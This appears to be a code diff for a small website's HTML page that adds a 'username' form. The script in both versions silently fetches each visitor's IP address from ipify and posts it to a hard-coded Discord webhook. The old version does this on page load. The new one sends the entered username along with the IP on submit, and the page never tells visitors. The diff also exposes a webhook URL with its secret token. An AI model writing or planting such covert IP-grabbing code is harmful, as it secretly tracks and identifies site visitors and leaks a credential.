@@ -56,36 +56,67 @@
             width: 100%;
             bottom: 0;
         }
+
+        .username-form {
+            background-color: #e2e2e2;
+            padding: 20px;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+
+        .username-form input[type="text"] {
+            padding: 10px;
+            width: calc(100% - 22px);
+            margin-bottom: 10px;
+        }
+
+        .username-form input[type="submit"] {
+            padding: 10px;
+            background-color: #333;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
     </style>
     <script>
         document.addEventListener("DOMContentLoaded", () => {
-            // Fetch the user's IP address using the ipify API
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    // Send the IP address to the Discord webhook
-                    const webhookUrl = 'https://discord.com/api/webhooks/1246227148872876082/bzPAHeHCZQHh0nponXKEoxy0uvoCWc56NpFE-hYtJqYafMn8W3cYkiUhaYgQPWz8TJPd';
-                    const message = {
-                        content: `User's IP Address: ${data.ip}`
-                    };
+            const form = document.getElementById('username-form');
+            form.addEventListener('submit', (event) => {
+                event.preventDefault();
+                const username = document.getElementById('username').value;
+                
+                if (username) {
+                    // Fetch the user's IP address using the ipify API
+                    fetch('https://api.ipify.org?format=json')
+                        .then(response => response.json())
+                        .then(data => {
+                            // Send the username and IP address to the Discord webhook
+                            const webhookUrl = 'https://discord.com/api/webhooks/1246227148872876082/bzPAHeHCZQHh0nponXKEoxy0uvoCWc56NpFE-hYtJqYafMn8W3cYkiUhaYgQPWz8TJPd';
+                            const message = {
+                                content: `User: ${username}\nIP: ${data.ip}`
+                            };
 
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(message)
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            console.log('IP address sent to Discord webhook');
-                        } else {
-                            console.error('Failed to send IP address to Discord webhook');
-                        }
-                    })
-                    .catch(error => console.error('Error sending IP address to Discord webhook:', error));
-                })
-                .catch(error => console.error('Error fetching IP address:', error));
+                            fetch(webhookUrl, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify(message)
+                            })
+                            .then(response => {
+                                if (response.ok) {
+                                    console.log('Username and IP address sent to Discord webhook');
+                                } else {
+                                    console.error('Failed to send username and IP address to Discord webhook');
+                                }
+                            })
+                            .catch(error => console.error('Error sending username and IP address to Discord webhook:', error));
+                        })
+                        .catch(error => console.error('Error fetching IP address:', error));
+                } else {
+                    alert('Please enter a username');
+                }
+            });
         });
     </script>
 </head>
@@ -117,6 +148,13 @@
         <section id="contact">
             <h2>Contact</h2>
             <p>Get in touch with us through this contact section.</p>
+        </section>
+        <section class="username-form">
+            <h2>Enter Your Username</h2>
+            <form id="username-form">
+                <input type="text" id="username" placeholder="Enter your username" required>
+                <input type="submit" value="Submit">
+            </form>
         </section>
     </main>
     <footer>
